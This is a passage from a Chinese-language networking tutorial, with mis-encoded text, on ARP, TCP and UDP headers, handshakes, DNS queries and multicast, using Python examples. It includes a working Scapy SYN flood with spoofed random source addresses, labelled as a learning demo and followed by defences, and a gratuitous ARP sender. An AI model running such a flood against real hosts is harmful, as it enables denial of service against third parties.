              hwsrc=mac,
              hwdst="ff:ff:ff:ff:ff:ff")  # å¹¿æ’­

    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)
    packet = ether / arp

    sendp(packet, iface=interface, verbose=0)
    print(f"å·²å‘é€å…è´¹ARP: IP={ip}, MAC={mac}")

# ä½¿ç”¨ç¤ºä¾‹
send_gratuitous_arp("eth0", "192.168.1.100", "00:0c:29:6f:8a:9b")
</code></pre>
<hr />
<h2 id="ç¬¬äº”ç« ä¼ è¾“å±‚åè®®"><a class="header" href="#ç¬¬äº”ç« ä¼ è¾“å±‚åè®®">ç¬¬äº”ç« ï¼šä¼ è¾“å±‚åè®®</a></h2>
<h3 id="51-tcp-transmission-control-protocol-åè®®"><a class="header" href="#51-tcp-transmission-control-protocol-åè®®">5.1 TCP (Transmission Control Protocol) åè®®</a></h3>
<h4 id="tcpæ®µç»“æ„"><a class="header" href="#tcpæ®µç»“æ„">TCPæ®µç»“æ„</a></h4>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         Source Port           â”‚      Destination Port         â”‚
â”‚           16 bits             â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                      Sequence Number                          â”‚
â”‚                          32 bits                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  Acknowledgment Number                        â”‚
â”‚                          32 bits                              â”‚
â”œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚Data â”‚Rsvd â”‚Nâ”‚Câ”‚Eâ”‚Uâ”‚Aâ”‚Pâ”‚Râ”‚Sâ”‚Fâ”‚                               â”‚
â”‚Offsetâ”‚     â”‚Sâ”‚Wâ”‚Câ”‚Râ”‚Câ”‚Sâ”‚Sâ”‚Yâ”‚Iâ”‚        Window Size            â”‚
â”‚4 bitsâ”‚3 bitsâ”‚1â”‚1â”‚1â”‚1â”‚1â”‚1â”‚1â”‚1â”‚1â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚           Checksum            â”‚      Urgent Pointer           â”‚
â”‚           16 bits             â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Options (if any)                           â”‚
â”‚                      Variable                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                          Data                                 â”‚
â”‚                      Variable                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å­—æ®µè¯¦è§£</strong>:</p>
<ol>
<li>
<p><strong>Source/Destination Port (16 bits each)</strong>: æº/ç›®æ ‡ç«¯å£å·</p>
<ul>
<li>èŒƒå›´: 0-65535</li>
<li>0-1023: çŸ¥åç«¯å£</li>
<li>1024-49151: æ³¨å†Œç«¯å£</li>
<li>49152-65535: åŠ¨æ€ç«¯å£</li>
</ul>
</li>
<li>
<p><strong>Sequence Number (32 bits)</strong>: åºåˆ—å·</p>
<ul>
<li>æ ‡è¯†å‘é€çš„å­—èŠ‚æµä½ç½®</li>
<li>åˆå§‹å€¼éšæœºç”Ÿæˆï¼ˆISNï¼‰</li>
<li>ç”¨äºæ•°æ®æ’åºå’Œé‡ä¼ </li>
</ul>
</li>
<li>
<p><strong>Acknowledgment Number (32 bits)</strong>: ç¡®è®¤å·</p>
<ul>
<li>æœŸæœ›æ¥æ”¶çš„ä¸‹ä¸€ä¸ªå­—èŠ‚çš„åºåˆ—å·</li>
<li>ACKæ ‡å¿—ä¸º1æ—¶æœ‰æ•ˆ</li>
</ul>
</li>
<li>
<p><strong>Data Offset (4 bits)</strong>: æ•°æ®åç§»</p>
<ul>
<li>TCPå¤´éƒ¨é•¿åº¦</li>
<li>å•ä½: 32ä½å­—(4å­—èŠ‚)</li>
<li>èŒƒå›´: 5-15 (20-60å­—èŠ‚)</li>
</ul>
</li>
<li>
<p><strong>Reserved (3 bits)</strong>: ä¿ç•™å­—æ®µ</p>
</li>
<li>
<p><strong>Flags (9 bits)</strong>: æ§åˆ¶æ ‡å¿—</p>
<pre><code>NS  (1 bit): ECN-nonce
CWR (1 bit): Congestion Window Reduced
ECE (1 bit): ECN-Echo
URG (1 bit): Urgent pointeræœ‰æ•ˆ
ACK (1 bit): Acknowledgmentæœ‰æ•ˆ
PSH (1 bit): PushåŠŸèƒ½
RST (1 bit): Resetè¿æ¥
SYN (1 bit): Synchronizeåºåˆ—å·
FIN (1 bit): Finishï¼Œå‘é€æ–¹å®Œæˆå‘é€
</code></pre>
</li>
<li>
<p><strong>Window Size (16 bits)</strong>: çª—å£å¤§å°</p>
<ul>
<li>æ¥æ”¶çª—å£å¤§å°ï¼ˆå­—èŠ‚ï¼‰</li>
<li>ç”¨äºæµé‡æ§åˆ¶</li>
</ul>
</li>
<li>
<p><strong>Checksum (16 bits)</strong>: æ ¡éªŒå’Œ</p>
<ul>
<li>æ ¡éªŒå¤´éƒ¨ã€æ•°æ®å’Œä¼ªå¤´éƒ¨</li>
</ul>
</li>
<li>
<p><strong>Urgent Pointer (16 bits)</strong>: ç´§æ€¥æŒ‡é’ˆ</p>
<ul>
<li>URG=1æ—¶æœ‰æ•ˆ</li>
<li>æŒ‡å‘ç´§æ€¥æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚</li>
</ul>
</li>
<li>
<p><strong>Options (Variable)</strong>: é€‰é¡¹å­—æ®µ</p>
<ul>
<li>MSS (Maximum Segment Size): æœ€å¤§æ®µå¤§å°</li>
<li>Window Scale: çª—å£æ‰©å¤§å› å­</li>
<li>SACK (Selective Acknowledgment): é€‰æ‹©æ€§ç¡®è®¤</li>
<li>Timestamps: æ—¶é—´æˆ³</li>
</ul>
</li>
</ol>
<h4 id="tcpä¸‰æ¬¡æ¡æ‰‹"><a class="header" href="#tcpä¸‰æ¬¡æ¡æ‰‹">TCPä¸‰æ¬¡æ¡æ‰‹</a></h4>
<pre><code>å®¢æˆ·ç«¯                                  æœåŠ¡å™¨
   â”‚                                      â”‚
   â”‚                                      â”‚  (LISTENçŠ¶æ€)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€ SYN (seq=x) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  â”‚  æ­¥éª¤1: SYN
   â”‚  (SYN_SENTçŠ¶æ€)                      â”‚  (SYN_RCVDçŠ¶æ€)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€ SYN+ACK (seq=y, ack=x+1) â”€â”€â”€â”€â”€  â”‚  æ­¥éª¤2: SYN+ACK
   â”‚                                      â”‚
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€ ACK (seq=x+1, ack=y+1) â”€â”€â”€â”€â”€â”€â†’ â”‚  æ­¥éª¤3: ACK
   â”‚  (ESTABLISHEDçŠ¶æ€)                   â”‚  (ESTABLISHEDçŠ¶æ€)
   â”‚                                      â”‚
   â”‚ â•â•â•â•â•â•â• æ•°æ®ä¼ è¾“ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”‚
   â”‚                                      â”‚
</code></pre>
<p><strong>è¯¦ç»†äº¤äº’è¿‡ç¨‹</strong>:</p>
<pre><code>æ­¥éª¤1: å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ (SYN)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SYN = 1                              â”‚
â”‚ ACK = 0                              â”‚
â”‚ Seq = ISN_client (å¦‚ 1000)           â”‚
â”‚ Ack = 0                              â”‚
â”‚ Options: MSS=1460, Window Scale=7    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤2: æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ (SYN+ACK)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SYN = 1                              â”‚
â”‚ ACK = 1                              â”‚
â”‚ Seq = ISN_server (å¦‚ 2000)           â”‚
â”‚ Ack = ISN_client + 1 (1001)          â”‚
â”‚ Options: MSS=1460, Window Scale=7    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤3: å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ (ACK)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SYN = 0                              â”‚
â”‚ ACK = 1                              â”‚
â”‚ Seq = ISN_client + 1 (1001)          â”‚
â”‚ Ack = ISN_server + 1 (2001)          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿ</strong></p>
<ol>
<li><strong>é˜²æ­¢æ—§è¿æ¥</strong>: é¿å…å·²å¤±æ•ˆçš„è¿æ¥è¯·æ±‚çªç„¶åˆä¼ é€åˆ°æœåŠ¡å™¨</li>
<li><strong>åŒå‘ç¡®è®¤</strong>: ç¡®è®¤åŒæ–¹çš„å‘é€å’Œæ¥æ”¶èƒ½åŠ›éƒ½æ­£å¸¸</li>
<li><strong>åŒæ­¥åºåˆ—å·</strong>: åŒæ–¹äº¤æ¢åˆå§‹åºåˆ—å·ï¼ˆISNï¼‰</li>
</ol>
<p><strong>SYN Floodæ”»å‡»ä¸é˜²å¾¡</strong>:</p>
<pre><code class="language-python">from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port, count=100):
    """SYN Floodæ”»å‡»æ¼”ç¤ºï¼ˆä»…ç”¨äºå­¦ä¹ ï¼‰"""
    print(f"[!] è­¦å‘Š: è¿™æ˜¯æ”»å‡»æ¼”ç¤ºä»£ç ï¼Œä»…ç”¨äºå®‰å…¨å­¦ä¹ ")
    print(f"æ­£åœ¨å‘ {target_ip}:{target_port} å‘é€SYNåŒ…...")

    for i in range(count):
        # éšæœºæºIPå’Œæºç«¯å£
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}." \
                 f"{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)

        # æ„é€ SYNåŒ…
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags='S',
                  seq=random.randint(0, 2**32-1))

        send(ip/tcp, verbose=0)

        if (i+1) % 10 == 0:
            print(f"å·²å‘é€ {i+1} ä¸ªSYNåŒ…")

# é˜²å¾¡SYN Flood
"""
1. SYN Cookies: ä¸ä¿å­˜åŠè¿æ¥çŠ¶æ€
2. å¢å¤§SYNé˜Ÿåˆ—: sysctl -w net.ipv4.tcp_max_syn_backlog=4096
3. å‡å°‘SYN-ACKé‡ä¼ æ¬¡æ•°: sysctl -w net.ipv4.tcp_synack_retries=1
4. ä½¿ç”¨é˜²ç«å¢™é™åˆ¶: iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
"""
</code></pre>
<h4 id="tcpå››æ¬¡æŒ¥æ‰‹"><a class="header" href="#tcpå››æ¬¡æŒ¥æ‰‹">TCPå››æ¬¡æŒ¥æ‰‹</a></h4>
<pre><code>å®¢æˆ·ç«¯                                  æœåŠ¡å™¨
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€ FIN (seq=u) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  â”‚  æ­¥éª¤1: FIN
   â”‚  (FIN_WAIT_1çŠ¶æ€)                    â”‚  (CLOSE_WAITçŠ¶æ€)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€ ACK (ack=u+1) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚  æ­¥éª¤2: ACK
   â”‚  (FIN_WAIT_2çŠ¶æ€)                    â”‚
   â”‚                                      â”‚
   â”‚                                      â”‚  (æœåŠ¡å™¨ç»§ç»­å‘é€æ•°æ®)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€ FIN (seq=v) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  æ­¥éª¤3: FIN
   â”‚  (TIME_WAITçŠ¶æ€)                     â”‚  (LAST_ACKçŠ¶æ€)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€ ACK (ack=v+1) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  æ­¥éª¤4: ACK
   â”‚                                      â”‚  (CLOSEDçŠ¶æ€)
   â”‚  (ç­‰å¾…2MSLåCLOSED)                  â”‚
   â”‚                                      â”‚
</code></pre>
<p><strong>TIME_WAITçŠ¶æ€çš„æ„ä¹‰</strong>:</p>
<pre><code>1. ç¡®ä¿æœ€åçš„ACKèƒ½å¤Ÿåˆ°è¾¾
   - å¦‚æœæœ€åçš„ACKä¸¢å¤±ï¼ŒæœåŠ¡å™¨ä¼šé‡ä¼ FIN
   - TIME_WAITçŠ¶æ€å¯ä»¥å“åº”é‡ä¼ çš„FIN

2. ç¡®ä¿æ—§è¿æ¥çš„æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­æ¶ˆå¤±
   - ç­‰å¾…æ—¶é—´: 2MSL (Maximum Segment Lifetime)
   - MSLé€šå¸¸ä¸º30ç§’-2åˆ†é’Ÿ
   - 2MSL = 4åˆ†é’Ÿå·¦å³
</code></pre>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šTCPè¿æ¥ç®¡ç†</strong></p>
<pre><code class="language-python">import socket
import struct
import time

class TCPConnection:
    """TCPè¿æ¥ç®¡ç†"""

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.state = 'CLOSED'

    def connect(self, host, port):
        """å»ºç«‹TCPè¿æ¥"""
        print(f"[*] æ­£åœ¨è¿æ¥ {host}:{port}...")
        print(f"    çŠ¶æ€: {self.state} -&gt; SYN_SENT")

        try:
            self.sock.connect((host, port))
            self.state = 'ESTABLISHED'
            print(f"    çŠ¶æ€: SYN_SENT -&gt; ESTABLISHED")
            print(f"[+] è¿æ¥æˆåŠŸ!")

            # è·å–è¿æ¥ä¿¡æ¯
            local_addr = self.sock.getsockname()
            remote_addr = self.sock.getpeername()
            print(f"    æœ¬åœ°åœ°å€: {local_addr[0]}:{local_addr[1]}")
            print(f"    è¿œç¨‹åœ°å€: {remote_addr[0]}:{remote_addr[1]}")

            return True
        except Exception as e:
            print(f"[-] è¿æ¥å¤±è´¥: {e}")
            self.state = 'CLOSED'
            return False

    def send_data(self, data):
        """å‘é€æ•°æ®"""
        if self.state != 'ESTABLISHED':
            print("[-] è¿æ¥æœªå»ºç«‹")
            return False

        try:
            self.sock.sendall(data)
            print(f"[+] å·²å‘é€ {len(data)} å­—èŠ‚")
            return True
        except Exception as e:
            print(f"[-] å‘é€å¤±è´¥: {e}")
            return False

    def receive_data(self, buffer_size=4096):
        """æ¥æ”¶æ•°æ®"""
        if self.state != 'ESTABLISHED':
            print("[-] è¿æ¥æœªå»ºç«‹")
            return None

        try:
            data = self.sock.recv(buffer_size)
            print(f"[+] å·²æ¥æ”¶ {len(data)} å­—èŠ‚")
            return data
        except Exception as e:
            print(f"[-] æ¥æ”¶å¤±è´¥: {e}")
            return None

    def close(self):
        """å…³é—­è¿æ¥"""
        if self.state == 'CLOSED':
            return

        print(f"\n[*] æ­£åœ¨å…³é—­è¿æ¥...")
        print(f"    çŠ¶æ€: {self.state} -&gt; FIN_WAIT_1")

        self.sock.close()
        self.state = 'CLOSED'

        print(f"    çŠ¶æ€: FIN_WAIT_1 -&gt; FIN_WAIT_2 -&gt; TIME_WAIT -&gt; CLOSED")
        print(f"[+] è¿æ¥å·²å…³é—­")

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    conn = TCPConnection()

    if conn.connect('www.baidu.com', 80):
        # å‘é€HTTPè¯·æ±‚
        request = b'GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n'
        conn.send_data(request)

        # æ¥æ”¶å“åº”
        response = conn.receive_data()
        if response:
            print(f"\næ¥æ”¶åˆ°çš„æ•°æ®:\n{response[:200].decode('utf-8', errors='ignore')}...")

        # å…³é—­è¿æ¥
        conn.close()
</code></pre>
<h3 id="52-udp-user-datagram-protocol-åè®®"><a class="header" href="#52-udp-user-datagram-protocol-åè®®">5.2 UDP (User Datagram Protocol) åè®®</a></h3>
<h4 id="udpæ•°æ®æŠ¥ç»“æ„"><a class="header" href="#udpæ•°æ®æŠ¥ç»“æ„">UDPæ•°æ®æŠ¥ç»“æ„</a></h4>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         Source Port           â”‚      Destination Port         â”‚
â”‚           16 bits             â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚          Length               â”‚          Checksum             â”‚
â”‚         16 bits               â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                          Data                                 â”‚
â”‚                       (Variable)                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å­—æ®µè¯´æ˜</strong>:</p>
<ol>
<li><strong>Source Port (16 bits)</strong>: æºç«¯å£å·ï¼ˆå¯é€‰ï¼Œå¯ä»¥ä¸º0ï¼‰</li>
<li><strong>Destination Port (16 bits)</strong>: ç›®æ ‡ç«¯å£å·</li>
<li><strong>Length (16 bits)</strong>: UDPæ•°æ®æŠ¥æ€»é•¿åº¦ï¼ˆå¤´éƒ¨8å­—èŠ‚+æ•°æ®ï¼‰</li>
<li><strong>Checksum (16 bits)</strong>: æ ¡éªŒå’Œï¼ˆå¯é€‰ï¼ŒIPv4ä¸­å¯ä»¥ä¸º0ï¼‰</li>
</ol>
<h4 id="udpç‰¹ç‚¹"><a class="header" href="#udpç‰¹ç‚¹">UDPç‰¹ç‚¹</a></h4>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<pre><code>1. ä½å»¶è¿Ÿ - æ— éœ€å»ºç«‹è¿æ¥
2. ç®€å•é«˜æ•ˆ - å¤´éƒ¨ä»…8å­—èŠ‚
3. æ”¯æŒå¹¿æ’­å’Œç»„æ’­
4. æ— è¿æ¥çŠ¶æ€ç»´æŠ¤
</code></pre>
<p><strong>åŠ£åŠ¿</strong>:</p>
<pre><code>1. ä¸å¯é  - ä¸ä¿è¯æ•°æ®åˆ°è¾¾
2. æ— åº - ä¸ä¿è¯é¡ºåº
3. æ— æµé‡æ§åˆ¶
4. æ— æ‹¥å¡æ§åˆ¶
</code></pre>
<h4 id="udp-vs-tcpå¯¹æ¯”"><a class="header" href="#udp-vs-tcpå¯¹æ¯”">UDP vs TCPå¯¹æ¯”</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ç‰¹æ€§</th><th>TCP</th><th>UDP</th></tr></thead><tbody>
<tr><td><strong>è¿æ¥æ€§</strong></td><td>é¢å‘è¿æ¥</td><td>æ— è¿æ¥</td></tr>
<tr><td><strong>å¯é æ€§</strong></td><td>å¯é ä¼ è¾“</td><td>ä¸å¯é ä¼ è¾“</td></tr>
<tr><td><strong>é¡ºåº</strong></td><td>ä¿è¯é¡ºåº</td><td>ä¸ä¿è¯é¡ºåº</td></tr>
<tr><td><strong>å¤´éƒ¨å¤§å°</strong></td><td>20-60å­—èŠ‚</td><td>8å­—èŠ‚</td></tr>
<tr><td><strong>é€Ÿåº¦</strong></td><td>è¾ƒæ…¢</td><td>å¿«é€Ÿ</td></tr>
<tr><td><strong>å¼€é”€</strong></td><td>å¤§ï¼ˆç¡®è®¤ã€é‡ä¼ ï¼‰</td><td>å°</td></tr>
<tr><td><strong>æµé‡æ§åˆ¶</strong></td><td>æœ‰</td><td>æ— </td></tr>
<tr><td><strong>æ‹¥å¡æ§åˆ¶</strong></td><td>æœ‰</td><td>æ— </td></tr>
<tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>æ–‡ä»¶ä¼ è¾“ã€Web</td><td>è§†é¢‘ç›´æ’­ã€DNS</td></tr>
</tbody></table>
</div>
<h4 id="udpåº”ç”¨åœºæ™¯"><a class="header" href="#udpåº”ç”¨åœºæ™¯">UDPåº”ç”¨åœºæ™¯</a></h4>
<p><strong>1. å®æ—¶éŸ³è§†é¢‘ä¼ è¾“</strong></p>
<pre><code class="language-python">import socket

# UDPéŸ³é¢‘æµå‘é€ç«¯
def audio_sender(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # æ¨¡æ‹Ÿå‘é€éŸ³é¢‘æ•°æ®
    for i in range(100):
        audio_data = f"Audio Frame {i}".encode()
        sock.sendto(audio_data, (host, port))
        print(f"å‘é€éŸ³é¢‘å¸§ {i}")
        time.sleep(0.02)  # 50fps

    sock.close()

# UDPéŸ³é¢‘æµæ¥æ”¶ç«¯
def audio_receiver(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))

    print(f"æ­£åœ¨ç›‘å¬ç«¯å£ {port}...")

    while True:
        data, addr = sock.recvfrom(1024)
        print(f"ä» {addr} æ¥æ”¶: {data.decode()}")
</code></pre>
<p><strong>2. DNSæŸ¥è¯¢</strong></p>
<pre><code class="language-python">import socket
import struct

def dns_query(domain, dns_server='8.8.8.8', port=53):
    """å‘é€DNSæŸ¥è¯¢"""
    # æ„é€ DNSæŸ¥è¯¢æ•°æ®åŒ…
    transaction_id = 0x1234
    flags = 0x0100  # æ ‡å‡†æŸ¥è¯¢
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    # DNSå¤´éƒ¨
    header = struct.pack('!HHHHHH', transaction_id, flags, questions,
                         answer_rrs, authority_rrs, additional_rrs)

    # æŸ¥è¯¢éƒ¨åˆ†
    qname = b''
    for part in domain.split('.'):
        qname += bytes([len(part)]) + part.encode()
    qname += b'\x00'  # ç»“æŸç¬¦

    qtype = 1   # Aè®°å½•
    qclass = 1  # INç±»
    question = qname + struct.pack('!HH', qtype, qclass)

    # å‘é€æŸ¥è¯¢
    query = header + question
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    try:
        sock.sendto(query, (dns_server, port))
        response, _ = sock.recvfrom(512)
        print(f"DNSå“åº”é•¿åº¦: {len(response)} å­—èŠ‚")
        # è§£æå“åº”...
        return response
    except socket.timeout:
        print("DNSæŸ¥è¯¢è¶…æ—¶")
        return None
    finally:
        sock.close()

# ä½¿ç”¨ç¤ºä¾‹
dns_query("www.baidu.com")
</code></pre>
<p><strong>3. UDPç»„æ’­</strong></p>
<pre><code class="language-python">import socket
import struct

def udp_multicast_sender(multicast_group, port, ttl=2):
    """UDPç»„æ’­å‘é€ç«¯"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # è®¾ç½®TTL
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL,
                    struct.pack('b', ttl))

    try:
        for i in range(10):
            message = f"Multicast message {i}".encode()
            sock.sendto(message, (multicast_group, port))
            print(f"å‘é€ç»„æ’­æ¶ˆæ¯ {i}")
            time.sleep(1)
    finally:
        sock.close()

def udp_multicast_receiver(multicast_group, port):
    """UDPç»„æ’­æ¥æ”¶ç«¯"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # ç»‘å®šåˆ°ç«¯å£
    sock.bind(('', port))

    # åŠ å…¥ç»„æ’­ç»„
    mreq = struct.pack('4sl', socket.inet_aton(multicast_group),
                       socket.INADDR_ANY)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

    print(f"å·²åŠ å…¥ç»„æ’­ç»„ {multicast_group}:{port}")

    try:
        while True:
            data, addr = sock.recvfrom(1024)
            print(f"ä» {addr} æ¥æ”¶: {data.decode()}")
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()

# ä½¿ç”¨ç¤ºä¾‹
# å‘é€ç«¯: udp_multicast_sender('224.0.0.1', 5007)
# æ¥æ”¶ç«¯: udp_multicast_receiver('224.0.0.1', 5007)
</code></pre>
<hr />
